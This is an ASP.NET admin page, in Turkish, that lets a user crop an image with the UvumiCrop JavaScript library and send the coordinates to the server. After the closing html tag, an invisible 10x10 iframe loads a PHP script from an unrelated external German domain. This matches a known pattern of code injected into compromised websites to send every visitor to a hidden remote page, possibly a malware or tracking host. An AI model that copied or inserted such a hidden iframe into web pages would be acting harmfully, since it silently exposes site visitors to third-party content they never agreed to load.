<%@ Page Language="C#" AutoEventWireup="true" CodeFile="MansetResimCrop.aspx.cs" Inherits="Yonetim_GolfResimCrop" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Resim Kırpma</title>
    <style media="all" type="text/css">
        body {background:#000; margin:10px; color:#FFF;}
    </style>
    <script src="App/Crop/js/mootools-for-crop.js" type="text/javascript"></script>
    <script src="App/Crop/js/UvumiCrop-compressed.js" type="text/javascript"></script>
    <script src="App/Crop/sources/UvumiCrop.js" type="text/javascript"></script>
    <link href="App/Crop/css/uvumi-crop.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript">
        exampleCropper1 = new uvumiCropper('example1', {
            onComplete: function (top, left, width, height) {
                $('input_y').set('value', top);
                $('input_x').set('value', left);
                $('input_w').set('value', width);
                $('input_h').set('value', height);
            },
            keepRatio: true,
            mini: { x: 940, y: 250 }
        });
	</script>
</head>
<body>
    <form id="form1" runat="server">
        <asp:Button ID="Button1" runat="server" Text="Resimi Kes ve Geri Dön" onclick="Button1_Click" />
        <br />
        <br />
        Koordinat (x, y):
        <asp:TextBox runat="server" ID="input_y" Width="50" ReadOnly="false"></asp:TextBox>
        &nbsp;<asp:TextBox runat="server" ID="input_x" Width="50" ReadOnly="false"></asp:TextBox>
        &nbsp;Genişlik:<asp:TextBox runat="server" ID="input_w" Width="50" ReadOnly="false"></asp:TextBox>
        &nbsp;Y&uuml;kseklik:<asp:TextBox runat="server" ID="input_h" Width="50" ReadOnly="false"></asp:TextBox>
        <br /><br />
        <asp:Image runat="server" ID="example1" />
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




